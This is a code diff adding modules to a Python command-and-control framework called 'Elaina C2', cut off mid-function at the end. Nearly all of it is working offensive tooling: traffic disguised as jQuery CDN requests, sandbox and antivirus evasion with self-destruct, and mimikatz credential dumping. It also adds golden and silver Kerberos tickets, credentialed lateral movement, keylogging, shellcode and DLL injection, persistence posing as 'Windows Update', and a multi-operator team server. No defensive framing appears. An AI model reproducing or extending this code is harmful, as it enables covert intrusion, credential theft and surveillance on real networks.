@@ -27,9 +27,19 @@ import string
 import ctypes
 import platform
 import getpass
+import inspect
+import ast
+import types
+import shutil
+import glob
+import pickle
+import signal
+import uuid
+import io
+import binascii
 from datetime import datetime, timedelta
-from functools import wraps
-from collections import defaultdict
+from functools import wraps, partial
+from collections import defaultdict, deque
 import requests
 import cloudscraper
 from bs4 import BeautifulSoup
@@ -68,9 +78,6 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
-warnings.filterwarnings("ignore", message="Unverified HTTPS request")
-init(autoreset=True)
-
 from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, 
                             QPushButton, QGroupBox, QTextEdit, QLabel, QSplitter, 
@@ -81,12 +88,17 @@ from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QH
                             QButtonGroup, QListWidget, QListWidgetItem, QProgressBar,
                             QInputDialog, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
                             QGraphicsView, QGraphicsScene, QGraphicsItem, QGraphicsEllipseItem,
-                            QGraphicsLineItem, QGraphicsTextItem, QGridLayout, QSizePolicy)
-from PyQt5.QtCore import Qt, pyqtSignal, QTimer, QThread, QSize, QUrl, QMimeData, QBuffer, QIODevice, QPoint, QRect, QPointF
-from PyQt5.QtGui import QIcon, QFont, QPixmap, QImage, QTextCharFormat, QColor, QClipboard, QDrag, QDesktopServices, QPainter, QPen, QBrush
+                            QGraphicsLineItem, QGraphicsTextItem, QGridLayout, QSizePolicy,
+                            QStackedWidget, QDockWidget, QMdiArea, QMdiSubWindow, QTextBrowser,
+                            QToolButton, QSizePolicy, QSpacerItem, QSplitterHandle)
+from PyQt5.QtCore import Qt, pyqtSignal, QTimer, QThread, QSize, QUrl, QMimeData, QBuffer, QIODevice, QPoint, QRect, QPointF, QSettings, QDataStream
+from PyQt5.QtGui import QIcon, QFont, QPixmap, QImage, QTextCharFormat, QColor, QClipboard, QDrag, QDesktopServices, QPainter, QPen, QBrush, QTextCursor, QKeySequence, QTextDocument
 from PyQt5.QtWebEngineWidgets import QWebEngineView
 from PyQt5.QtWebChannel import QWebChannel
-from PyQt5.QtWebSockets import QWebSocketServer
+from PyQt5.QtWebSockets import QWebSocketServer, QWebSocket
+
+warnings.filterwarnings("ignore", message="Unverified HTTPS request")
+init(autoreset=True)
 
 LOG_JSON_PATH = "elaina_ultimate_log.json"
 COOKIE_PATH = "elaina_ultimate_cookies.txt"
@@ -94,8 +106,11 @@ LOG_JSON_FILE = "adcs_exploit_log.json"
 CCACHE_PATH = "golden_ticket.ccache"
 C2_CONFIG_PATH = "c2_config.json"
 BEACON_CONFIG_PATH = "beacon_config.bin"
+BOF_DIR = "bof"
+SCRIPT_DIR = "scripts"
+PROFILE_DIR = "profiles"
 
-logger = logging.getLogger("Elaina-C2")
+logger = logging.getLogger("ELAINA-C2")
 logger.setLevel(logging.DEBUG)
 console_handler = logging.StreamHandler()
 console_format = logging.Formatter("\033[1;32m%(asctime)s\033[0m [\033[1;34m%(levelname)s\033[0m] \033[1;33m%(module)s\033[0m: %(message)s", datefmt="%H:%M:%S")
@@ -226,6 +241,1115 @@ class TrafficShaper:
         sleep_time = base_sleep * (1 + jitter)
         time.sleep(sleep_time)
 
+class MalleableC2Profile:
+    def __init__(self, profile_path=None):
+        self.profile = {
+            "http-get": {
+                "uri": "/jquery.min.js",
+                "client": {
+                    "headers": {
+                        "Accept": "*/*",
+                        "Host": "cdn.jquery.com"
+                    }
+                },
+                "server": {
+                    "output": {
+                        "type": "base64"
+                    }
+                }
+            },
+            "http-post": {
+                "uri": "/submit.php",
+                "client": {
+                    "headers": {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    "data": "data="
+                },
+                "server": {
+                    "output": {
+                        "type": "base64"
+                    }
+                }
+            },
+            "http-stager": {
+                "uri": "/jquery-3.3.2.min.js",
+                "client": {
+                    "headers": {
+                        "Accept": "*/*",
+                        "Host": "cdn.jquery.com"
+                    }
+                }
+            },
+            "process-inject": {
+                "transform-x64": "x86\\shikata_ga_nai",
+                "transform-x86": "x86\\shikata_ga_nai",
+                "execute": {
+                    "method": "CreateThread"
+                }
+            },
+            "stage": {
+                "checksum": "true",
+                "sleep": "5000"
+            }
+        }
+        
+        if profile_path and os.path.exists(profile_path):
+            with open(profile_path, 'r') as f:
+                custom_profile = json.load(f)
+                self.profile.update(custom_profile)
+    
+    def get_http_get_config(self):
+        return self.profile.get("http-get", {})
+    
+    def get_http_post_config(self):
+        return self.profile.get("http-post", {})
+    
+    def get_http_stager_config(self):
+        return self.profile.get("http-stager", {})
+    
+    def get_process_inject_config(self):
+        return self.profile.get("process-inject", {})
+    
+    def get_stage_config(self):
+        return self.profile.get("stage", {})
+
+class SleepObfuscation:
+    def __init__(self, method="thread_stack"):
+        self.method = method
+        
+    def obfuscate_sleep(self, sleep_time):
+        if self.method == "thread_stack":
+            self._thread_stack_obfuscation(sleep_time)
+        elif self.method == "memory_encryption":
+            self._memory_encryption_obfuscation(sleep_time)
+        elif self.method == "api_call_obfuscation":
+            self._api_call_obfuscation(sleep_time)
+        else:
+            time.sleep(sleep_time)
+    
+    def _thread_stack_obfuscation(self, sleep_time):
+        end_time = time.time() + sleep_time
+        while time.time() < end_time:
+            remaining = end_time - time.time()
+            if remaining <= 0:
+                break
+                
+            chunk_size = min(remaining, random.uniform(0.1, 0.5))
+            time.sleep(chunk_size)
+            
+            if random.random() < 0.3:
+                self._random_api_call()
+    
+    def _memory_encryption_obfuscation(self, sleep_time):
+        end_time = time.time() + sleep_time
+        while time.time() < end_time:
+            remaining = end_time - time.time()
+            if remaining <= 0:
+                break
+                
+            chunk_size = min(remaining, random.uniform(0.1, 0.5))
+            
+            if random.random() < 0.5:
+                self._encrypt_memory_region()
+                
+            time.sleep(chunk_size)
+            
+            if random.random() < 0.3:
+                self._decrypt_memory_region()
+    
+    def _api_call_obfuscation(self, sleep_time):
+        end_time = time.time() + sleep_time
+        while time.time() < end_time:
+            remaining = end_time - time.time()
+            if remaining <= 0:
+                break
+                
+            chunk_size = min(remaining, random.uniform(0.1, 0.5))
+            time.sleep(chunk_size)
+            
+            self._random_api_call()
+    
+    def _random_api_call(self):
+        if platform.system() == "Windows":
+            calls = [
+                lambda: ctypes.windll.kernel32.GetTickCount(),
+                lambda: ctypes.windll.kernel32.QueryPerformanceCounter(ctypes.byref(ctypes.c_ulonglong())),
+                lambda: ctypes.windll.kernel32.GetSystemTime(ctypes.byref(ctypes.wintypes.SYSTEMTIME())),
+                lambda: ctypes.windll.user32.GetCursorPos(ctypes.byref(ctypes.wintypes.POINT()))
+            ]
+            
+            random.choice(calls)()
+    
+    def _encrypt_memory_region(self):
+        pass
+    
+    def _decrypt_memory_region(self):
+        pass
+
+class OPSECManager:
+    def __init__(self, beacon):
+        self.beacon = beacon
+        self.sandbox_indicators = [
+            "sample", "malware", "analysis", "sandbox", "cuckoo", "joe", 
+            "vmware", "virtualbox", "qemu", "xen", "virtual", "hyper-v"
+        ]
+        self.vm_indicators = [
+            "vmware", "virtualbox", "qemu", "xen", "virtual", "hyper-v"
+        ]
+        self.debugger_indicators = [
+            "ollydbg", "ida", "windbg", "immunity", "x64dbg", "cheat engine"
+        ]
+        
+    def environment_check(self):
+        checks = {
+            "vm_detection": self.detect_vm(),
+            "sandbox_detection": self.detect_sandbox(),
+            "debugger_detection": self.detect_debugger(),
+            "av_detection": self.detect_av()
+        }
+        
+        return checks
+    
+    def detect_vm(self):
+        try:
+            result = self.beacon.execute_task({
+                "type": "shell",
+                "data": "wmic computersystem get model"
+            })
+            
+            model = result.get("stdout", "").lower()
+            for indicator in self.vm_indicators:
+                if indicator in model:
+                    return True
+                    
+            result = self.beacon.execute_task({
+                "type": "shell",
+                "data": "wmic bios get serialnumber"
+            })
+            
+            serial = result.get("stdout", "").lower()
+            for indicator in self.vm_indicators:
+                if indicator in serial:
+                    return True
+                    
+            result = self.beacon.execute_task({
+                "type": "shell",
+                "data": "wmic diskdrive get model"
+            })
+            
+            disk_model = result.get("stdout", "").lower()
+            for indicator in self.vm_indicators:
+                if indicator in disk_model:
+                    return True
+        except:
+            pass
+            
+        return False
+    
+    def detect_sandbox(self):
+        try:
+            result = self.beacon.execute_task({
+                "type": "shell",
+                "data": "hostname"
+            })
+            
+            hostname = result.get("stdout", "").lower()
+            for indicator in self.sandbox_indicators:
+                if indicator in hostname:
+                    return True
+                    
+            result = self.beacon.execute_task({
+                "type": "shell",
+                "data": "systeminfo | findstr /B /C:\"System Model\""
+            })
+            
+            model = result.get("stdout", "").lower()
+            for indicator in self.sandbox_indicators:
+                if indicator in model:
+                    return True
+                    
+            result = self.beacon.execute_task({
+                "type": "shell",
+                "data": "tasklist /svc"
+            })
+            
+            processes = result.get("stdout", "").lower()
+            for indicator in self.sandbox_indicators:
+                if indicator in processes:
+                    return True
+        except:
+            pass
+            
+        return False
+    
+    def detect_debugger(self):
+        try:
+            if platform.system() == "Windows":
+                result = self.beacon.execute_task({
+                    "type": "shell",
+                    "data": "tasklist /m"
+                })
+                
+                modules = result.get("stdout", "").lower()
+                for indicator in self.debugger_indicators:
+                    if indicator in modules:
+                        return True
+        except:
+            pass
+            
+        return False
+    
+    def detect_av(self):
+        try:
+            if platform.system() == "Windows":
+                result = self.beacon.execute_task({
+                    "type": "shell",
+                    "data": "sc query type= service state= all | findstr /i \"antivirus\""
+                })
+                
+                av_services = result.get("stdout", "")
+                if "antivirus" in av_services.lower():
+                    return True
+                    
+                result = self.beacon.execute_task({
+                    "type": "shell",
+                    "data": "tasklist /svc | findstr /i \"av\""
+                })
+                
+                av_processes = result.get("stdout", "")
+                if "av" in av_processes.lower():
+                    return True
+        except:
+            pass
+            
+        return False
+    
+    def self_destruct(self, reason):
+        try:
+            self.beacon.execute_task({
+                "type": "shell",
+                "data": f"echo 'Self-destructing: {reason}' && del $env:temp\\beacon.exe"
+            })
+            
+            self.beacon.execute_task({
+                "type": "shell",
+                "data": "schtasks /delete /tn \"WindowsUpdate\" /f"
+            })
+            
+            self.beacon.execute_task({
+                "type": "shell",
+                "data": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f"
+            })
+        except:
+            pass
+            
+        sys.exit(0)
+
+class BOFManager:
+    def __init__(self, beacon):
+        self.beacon = beacon
+        self.loaded_bofs = {}
+        
+        if not os.path.exists(BOF_DIR):
+            os.makedirs(BOF_DIR)
+    
+    def load_bof(self, bof_path):
+        if not os.path.exists(bof_path):
+            return False
+            
+        try:
+            with open(bof_path, 'rb') as f:
+                bof_data = f.read()
+            
+            bof_name = os.path.basename(bof_path)
+            self.loaded_bofs[bof_name] = bof_data
+            
+            return True
+        except:
+            return False
+    
+    def load_all_bofs(self):
+        for bof_file in glob.glob(os.path.join(BOF_DIR, "*.o")):
+            self.load_bof(bof_file)
+    
+    def execute_bof(self, bof_name, args=None):
+        if bof_name not in self.loaded_bofs:
+            return {"status": "error", "message": f"BOF {bof_name} not loaded"}
+            
+        try:
+            bof_data = self.loaded_bofs[bof_name]
+            encoded_bof = base64.b64encode(bof_data).decode('utf-8')
+            
+            task_data = {
+                "bof_data": encoded_bof,
+                "entry_point": "go"
+            }
+            
+            if args:
+                task_data["args"] = args
+                
+            return self.beacon.execute_task({
+                "type": "bof",
+                "data": task_data
+            })
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+    
+    def list_loaded_bofs(self):
+        return list(self.loaded_bofs.keys())
+    
+    def reflective_dll_injection(self, dll_path):
+        if not os.path.exists(dll_path):
+            return {"status": "error", "message": f"DLL {dll_path} not found"}
+            
+        try:
+            with open(dll_path, 'rb') as f:
+                dll_data = f.read()
+                
+            encoded_dll = base64.b64encode(dll_data).decode('utf-8')
+            
+            return self.beacon.execute_task({
+                "type": "reflective_dll",
+                "data": {
+                    "dll_data": encoded_dll,
+                    "function": "Execute"
+                }
+            })
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+class PostExploitationModule:
+    def __init__(self, beacon):
+        self.beacon = beacon
+        self.bof_manager = BOFManager(beacon)
+        self.bof_manager.load_all_bofs()
+        
+    def execute_mimikatz(self, command="sekurlsa::logonpasswords"):
+        mimikatz_args = {
+            "command": command
+        }
+        
+        return self.beacon.execute_task({
+            "type": "mimikatz",
+            "data": mimikatz_args
+        })
+    
+    def lsass_dump(self):
+        return self.execute_mimikatz("lsadump::sam")
+    
+    def get_system_privs(self):
+        return self.execute_mimikatz("privilege::debug")
+    
+    def golden_ticket(self, domain, user, sid, krbtgt_hash, lifetime=10):
+        args = {
+            "domain": domain,
+            "user": user,
+            "sid": sid,
+            "krbtgt_hash": krbtgt_hash,
+            "lifetime": lifetime
+        }
+        
+        return self.beacon.execute_task({
+            "type": "golden_ticket",
+            "data": args
+        })
+    
+    def silver_ticket(self, domain, user, sid, service, service_hash, lifetime=10):
+        args = {
+            "domain": domain,
+            "user": user,
+            "sid": sid,
+            "service": service,
+            "service_hash": service_hash,
+            "lifetime": lifetime
+        }
+        
+        return self.beacon.execute_task({
+            "type": "silver_ticket",
+            "data": args
+        })
+    
+    def lateral_movement_psexec(self, target, username, password, command):
+        psexec_command = f"psexec \\\\{target} -u {username} -p {password} {command}"
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": psexec_command
+        })
+    
+    def lateral_movement_wmi(self, target, username, password, command):
+        wmi_command = f"wmic /node:\"{target}\" /user:\"{username}\" /password:\"{password}\" process call create \"{command}\""
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": wmi_command
+        })
+    
+    def lateral_movement_smb(self, target, username, password, command):
+        smb_command = f"smbclient //{target}/IPC$ -U {username}%{password} -c \"{command}\""
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": smb_command
+        })
+    
+    def lateral_movement_winrm(self, target, username, password, command):
+        winrm_command = f"winrs -r:{target} -u:{username} -p:{password} {command}"
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": winrm_command
+        })
+    
+    def privilege_escalation(self):
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": "powershell -c \"Invoke-AllChecks\""
+        })
+    
+    def port_scan(self, target, ports="1-1000"):
+        scan_command = f"powershell -c \"Invoke-Portscan -Hosts {target} -Ports {ports}\""
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": scan_command
+        })
+    
+    def ad_enumeration(self):
+        ad_command = "powershell -c \"Invoke-ADRecon -ReportFolder .\""
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": ad_command
+        })
+    
+    def keylogger_start(self):
+        return self.beacon.execute_task({
+            "type": "keylogger",
+            "data": {"action": "start"}
+        })
+    
+    def keylogger_stop(self):
+        return self.beacon.execute_task({
+            "type": "keylogger",
+            "data": {"action": "stop"}
+        })
+    
+    def keylogger_dump(self):
+        return self.beacon.execute_task({
+            "type": "keylogger",
+            "data": {"action": "dump"}
+        })
+    
+    def screenshot(self):
+        return self.beacon.execute_task({
+            "type": "screenshot",
+            "data": {}
+        })
+    
+    def process_inject(self, pid, shellcode):
+        args = {
+            "pid": pid,
+            "shellcode": base64.b64encode(shellcode).decode('utf-8')
+        }
+        
+        return self.beacon.execute_task({
+            "type": "process_inject",
+            "data": args
+        })
+    
+    def dll_inject(self, pid, dll_path):
+        args = {
+            "pid": pid,
+            "dll_path": dll_path
+        }
+        
+        return self.beacon.execute_task({
+            "type": "dll_inject",
+            "data": args
+        })
+    
+    def persistence_registry(self, key, value, data):
+        reg_command = f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {key} /t REG_SZ /d \"{data}\" /f"
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": reg_command
+        })
+    
+    def persistence_service(self, name, bin_path):
+        service_command = f"sc create {name} binPath= \"{bin_path}\" start= auto DisplayName= \"Windows Update\""
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": service_command
+        })
+    
+    def persistence_scheduled_task(self, name, command, trigger="daily"):
+        task_command = f"schtasks /create /tn {name} /tr \"{command}\" /sc {trigger} /ru System"
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": task_command
+        })
+    
+    def persistence_wmi_event(self, name, command):
+        wmi_command = f"powershell -c \"$FilterArgs = @{{Name='{name}'; EventName='Win32_ProcessStartTrace'; Command='{command}'}}; $Filter = New-WmiEventFilter -Namespace root\\subscription -QueryParameters $FilterArgs -Query \"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'\" -EventName $FilterArgs.EventName; $Consumer = New-WmiEventConsumer -CommandLineConsumer -CommandLineTemplate $FilterArgs.Command; $Binding = New-WmiEventFilterToConsumerBinding -Filter $Filter -Consumer $Consumer\""
+        
+        return self.beacon.execute_task({
+            "type": "shell",
+            "data": wmi_command
+        })
+
+class ElainaScriptEngine:
+    def __init__(self, main_window):
+        self.main_window = main_window
+        self.functions = {
+            "beacon_execute": self.beacon_execute,
+            "sleep": self.sleep,
+            "bprint": self.bprint,
+            "bdialog": self.bdialog,
+            "beacon_ids": self.beacon_ids,
+            "beacon_info": self.beacon_info,
+            "beacon_select": self.beacon_select,
+            "beacon_remove": self.beacon_remove,
+            "c2_start": self.c2_start,
+            "c2_stop": self.c2_stop,
+            "listener_add": self.listener_add,
+            "listener_remove": self.listener_remove,
+            "script_load": self.script_load,
+            "script_execute": self.script_execute,
+            "screenshot": self.screenshot,
+            "keylogger_start": self.keylogger_start,
+            "keylogger_stop": self.keylogger_stop,
+            "keylogger_dump": self.keylogger_dump,
+            "mimikatz": self.mimikatz,
+            "golden_ticket": self.golden_ticket,
+            "silver_ticket": self.silver_ticket,
+            "lateral_movement": self.lateral_movement,
+            "privilege_escalation": self.privilege_escalation,
+            "port_scan": self.port_scan,
+            "ad_enumeration": self.ad_enumeration,
+            "persistence": self.persistence,
+            "process_inject": self.process_inject,
+            "dll_inject": self.dll_inject,
+            "bof_load": self.bof_load,
+            "bof_execute": self.bof_execute,
+            "self_destruct": self.self_destruct
+        }
+        
+        self.loaded_scripts = {}
+        
+        if not os.path.exists(SCRIPT_DIR):
+            os.makedirs(SCRIPT_DIR)
+    
+    def execute_script(self, script_content, script_name="inline"):
+        try:
+            script_globals = {"__name__": "__main__"}
+            script_globals.update(self.functions)
+            
+            exec(script_content, script_globals)
+            
+            return True
+        except Exception as e:
+            self.bprint(f"Script execution error: {e}")
+            return False
+    
+    def load_script(self, script_path):
+        if not os.path.exists(script_path):
+            return False
+            
+        try:
+            with open(script_path, 'r') as f:
+                script_content = f.read()
+            
+            script_name = os.path.basename(script_path)
+            self.loaded_scripts[script_name] = script_content
+            
+            return True
+        except Exception as e:
+            self.bprint(f"Script load error: {e}")
+            return False
+    
+    def load_all_scripts(self):
+        for script_file in glob.glob(os.path.join(SCRIPT_DIR, "*.elaina")):
+            self.load_script(script_file)
+    
+    def beacon_execute(self, beacon_id, command):
+        if beacon_id in self.main_window.beacons:
+            return self.main_window.send_beacon_command(beacon_id, command)
+        return False
+    
+    def sleep(self, seconds):
+        time.sleep(seconds)
+    
+    def bprint(self, message):
+        self.main_window.add_log_entry(message)
+    
+    def bdialog(self, title, message):
+        dialog = QMessageBox()
+        dialog.setWindowTitle(title)
+        dialog.setText(message)
+        dialog.exec_()
+    
+    def beacon_ids(self):
+        return list(self.main_window.beacons.keys())
+    
+    def beacon_info(self, beacon_id):
+        if beacon_id in self.main_window.beacons:
+            return self.main_window.beacons[beacon_id]
+        return {}
+    
+    def beacon_select(self, beacon_id):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.select_beacon(beacon_id)
+            return True
+        return False
+    
+    def beacon_remove(self, beacon_id):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.remove_beacon_by_id(beacon_id)
+            return True
+        return False
+    
+    def c2_start(self, host, port, ssl=False):
+        self.main_window.c2_host_input.setText(host)
+        self.main_window.c2_port_input.setValue(port)
+        self.main_window.c2_ssl_checkbox.setChecked(ssl)
+        self.main_window.start_c2_server()
+        return True
+    
+    def c2_stop(self):
+        self.main_window.stop_c2_server()
+        return True
+    
+    def listener_add(self, name, listener_type, host, port, ssl=False):
+        self.main_window.listener_name_input.setText(name)
+        self.main_window.listener_type_combo.setCurrentText(listener_type)
+        self.main_window.listener_host_input.setText(host)
+        self.main_window.listener_port_input.setValue(port)
+        self.main_window.listener_ssl_checkbox.setChecked(ssl)
+        self.main_window.add_listener()
+        return True
+    
+    def listener_remove(self, name):
+        return self.main_window.remove_listener_by_name(name)
+    
+    def script_load(self, script_path):
+        return self.load_script(script_path)
+    
+    def script_execute(self, script_name):
+        if script_name in self.loaded_scripts:
+            return self.execute_script(self.loaded_scripts[script_name], script_name)
+        return False
+    
+    def screenshot(self, beacon_id):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.send_beacon_command(beacon_id, "screenshot")
+            return True
+        return False
+    
+    def keylogger_start(self, beacon_id):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.send_beacon_command(beacon_id, "keylogger_start")
+            return True
+        return False
+    
+    def keylogger_stop(self, beacon_id):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.send_beacon_command(beacon_id, "keylogger_stop")
+            return True
+        return False
+    
+    def keylogger_dump(self, beacon_id):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.send_beacon_command(beacon_id, "keylogger_dump")
+            return True
+        return False
+    
+    def mimikatz(self, beacon_id, command="sekurlsa::logonpasswords"):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.send_beacon_command(beacon_id, f"mimikatz {command}")
+            return True
+        return False
+    
+    def golden_ticket(self, beacon_id, domain, user, sid, krbtgt_hash, lifetime=10):
+        if beacon_id in self.main_window.beacons:
+            cmd = f"golden_ticket {domain} {user} {sid} {krbtgt_hash} {lifetime}"
+            self.main_window.send_beacon_command(beacon_id, cmd)
+            return True
+        return False
+    
+    def silver_ticket(self, beacon_id, domain, user, sid, service, service_hash, lifetime=10):
+        if beacon_id in self.main_window.beacons:
+            cmd = f"silver_ticket {domain} {user} {sid} {service} {service_hash} {lifetime}"
+            self.main_window.send_beacon_command(beacon_id, cmd)
+            return True
+        return False
+    
+    def lateral_movement(self, beacon_id, target, username, password, method="psexec", command="whoami"):
+        if beacon_id in self.main_window.beacons:
+            cmd = f"lateral_movement {method} {target} {username} {password} {command}"
+            self.main_window.send_beacon_command(beacon_id, cmd)
+            return True
+        return False
+    
+    def privilege_escalation(self, beacon_id):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.send_beacon_command(beacon_id, "privilege_escalation")
+            return True
+        return False
+    
+    def port_scan(self, beacon_id, target, ports="1-1000"):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.send_beacon_command(beacon_id, f"port_scan {target} {ports}")
+            return True
+        return False
+    
+    def ad_enumeration(self, beacon_id):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.send_beacon_command(beacon_id, "ad_enumeration")
+            return True
+        return False
+    
+    def persistence(self, beacon_id, method, name, data):
+        if beacon_id in self.main_window.beacons:
+            cmd = f"persistence {method} {name} {data}"
+            self.main_window.send_beacon_command(beacon_id, cmd)
+            return True
+        return False
+    
+    def process_inject(self, beacon_id, pid, shellcode_path):
+        if beacon_id in self.main_window.beacons:
+            with open(shellcode_path, 'rb') as f:
+                shellcode = base64.b64encode(f.read()).decode('utf-8')
+            cmd = f"process_inject {pid} {shellcode}"
+            self.main_window.send_beacon_command(beacon_id, cmd)
+            return True
+        return False
+    
+    def dll_inject(self, beacon_id, pid, dll_path):
+        if beacon_id in self.main_window.beacons:
+            cmd = f"dll_inject {pid} {dll_path}"
+            self.main_window.send_beacon_command(beacon_id, cmd)
+            return True
+        return False
+    
+    def bof_load(self, bof_path):
+        if hasattr(self.main_window, 'bof_manager'):
+            return self.main_window.bof_manager.load_bof(bof_path)
+        return False
+    
+    def bof_execute(self, beacon_id, bof_name, args=""):
+        if beacon_id in self.main_window.beacons and hasattr(self.main_window, 'bof_manager'):
+            return self.main_window.bof_manager.execute_bof(bof_name, args)
+        return False
+    
+    def self_destruct(self, beacon_id, reason="OPSEC check failed"):
+        if beacon_id in self.main_window.beacons:
+            self.main_window.send_beacon_command(beacon_id, f"self_destruct {reason}")
+            return True
+        return False
+
+class TeamServer:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.clients = {}
+        self.chat_history = []
+        self.shared_beacons = {}
+        self.shared_tasks = {}
+        self.server_socket = None
+        self.running = False
+        
+    def start(self):
+        try:
+            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.server_socket.bind((self.host, self.port))
+            self.server_socket.listen(5)
+            
+            self.running = True
+            
+            listener_thread = threading.Thread(target=self._listen_for_clients)
+            listener_thread.daemon = True
+            listener_thread.start()
+            
+            return True
+        except Exception as e:
+            logger.error(f"Failed to start Team Server: {str(e)}")
+            return False
+    
+    def stop(self):
+        self.running = False
+        
+        if self.server_socket:
+            self.server_socket.close()
+            
+        for client_id, client_info in self.clients.items():
+            try:
+                client_info["socket"].close()
+            except:
+                pass
+                
+        self.clients.clear()
+    
+    def _listen_for_clients(self):
+        while self.running:
+            try:
+                client_socket, client_address = self.server_socket.accept()
+                client_id = f"{client_address[0]}:{client_address[1]}:{int(time.time())}"
+                
+                logger.info(f"New Team Server connection from {client_address} assigned ID {client_id}")
+                
+                self.clients[client_id] = {
+                    "socket": client_socket,
+                    "address": client_address,
+                    "username": f"Operator_{random.randint(1000, 9999)}",
+                    "privileges": "user",
+                    "last_active": time.time()
+                }
+                
+                client_thread = threading.Thread(target=self._handle_client, args=(client_id,))
+                client_thread.daemon = True
+                client_thread.start()
+                
+                self._send_client_list()
+            except Exception as e:
+                logger.error(f"Error accepting Team Server client connection: {str(e)}")
+    
+    def _handle_client(self, client_id):
+        client = self.clients.get(client_id)
+        if not client:
+            return
+            
+        socket = client["socket"]
+        socket.settimeout(60)
+        
+        try:
+            while self.running:
+                try:
+                    ready = select.select([socket], [], [], 1)
+                    if ready[0]:
+                        data = socket.recv(4096)
+                        if not data:
+                            break
+                            
+                        message = self._parse_client_message(client_id, data)
+                        if message:
+                            self._process_client_message(client_id, message)
+                    
+                    client["last_active"] = time.time()
+                except socket.timeout:
+                    if time.time() - client["last_active"] > 300:
+                        logger.warning(f"Team Server client {client_id} timed out")
+                        break
+                except Exception as e:
+                    logger.error(f"Error handling Team Server client {client_id}: {str(e)}")
+                    break
+        except Exception as e:
+            logger.error(f"Error in Team Server client handler for {client_id}: {str(e)}")
+        finally:
+            if client_id in self.clients:
+                del self.clients[client_id]
+            try:
+                socket.close()
+            except:
+                pass
+            logger.info(f"Team Server client {client_id} disconnected")
+            self._send_client_list()
+    
+    def _parse_client_message(self, client_id, data):
+        try:
+            return json.loads(data.decode('utf-8'))
+        except Exception as e:
+            logger.error(f"Error parsing Team Server client message: {str(e)}")
+            return None
+    
+    def _process_client_message(self, client_id, message):
+        msg_type = message.get("type")
+        
+        if msg_type == "chat":
+            self.send_chat_message(client_id, message.get("message", ""))
+        elif msg_type == "username_change":
+            new_username = message.get("username", "")
+            if new_username and client_id in self.clients:
+                self.clients[client_id]["username"] = new_username
+                self._send_client_list()
+        elif msg_type == "beacon_share":
+            beacon_id = message.get("beacon_id", "")
+            if beacon_id:
+                self.share_beacon(client_id, beacon_id)
+        elif msg_type == "beacon_unshare":
+            beacon_id = message.get("beacon_id", "")
+            if beacon_id:
+                self.unshare_beacon(client_id, beacon_id)
+        elif msg_type == "beacon_command":
+            beacon_id = message.get("beacon_id", "")
+            command = message.get("command", "")
+            if beacon_id and command:
+                self.send_beacon_command(client_id, beacon_id, command)
+        elif msg_type == "ping":
+            self.send_pong(client_id)
+    
+    def send_chat_message(self, sender_id, message):
+        if not message.strip():
+            return False
+            
+        chat_entry = {
+            "sender": self.clients[sender_id]["username"],
+            "sender_id": sender_id,
+            "message": message,
+            "timestamp": time.time()
+        }
+        
+        self.chat_history.append(chat_entry)
+        
+        for client_id, client_info in self.clients.items():
+            try:
+                data = json.dumps({
+                    "type": "chat",
+                    "data": chat_entry
+                }).encode('utf-8')
+                client_info["socket"].send(data)
+            except:
+                pass
+                
+        return True
+    
+    def share_beacon(self, client_id, beacon_id):
+        if beacon_id not in self.shared_beacons:
+            self.shared_beacons[beacon_id] = {
+                "shared_by": client_id,
+                "shared_at": time.time(),
+                "shared_with": []
+            }
+            
+        if client_id not in self.shared_beacons[beacon_id]["shared_with"]:
+            self.shared_beacons[beacon_id]["shared_with"].append(client_id)
+            
+        for client_id, client_info in self.clients.items():
+            try:
+                data = json.dumps({
+                    "type": "beacon_shared",
+                    "data": {
+                        "beacon_id": beacon_id,
+                        "shared_by": self.clients[client_id]["username"],
+                        "shared_at": self.shared_beacons[beacon_id]["shared_at"]
+                    }
+                }).encode('utf-8')
+                client_info["socket"].send(data)
+            except:
+                pass
+                
+        return True
+    
+    def unshare_beacon(self, client_id, beacon_id):
+        if beacon_id in self.shared_beacons and client_id in self.shared_beacons[beacon_id]["shared_with"]:
+            self.shared_beacons[beacon_id]["shared_with"].remove(client_id)
+            
+            if not self.shared_beacons[beacon_id]["shared_with"]:
+                del self.shared_beacons[beacon_id]
+                
+            for client_id, client_info in self.clients.items():
+                try:
+                    data = json.dumps({
+                        "type": "beacon_unshared",
+                        "data": {
+                            "beacon_id": beacon_id,
+                            "unshared_by": self.clients[client_id]["username"]
+                        }
+                    }).encode('utf-8')
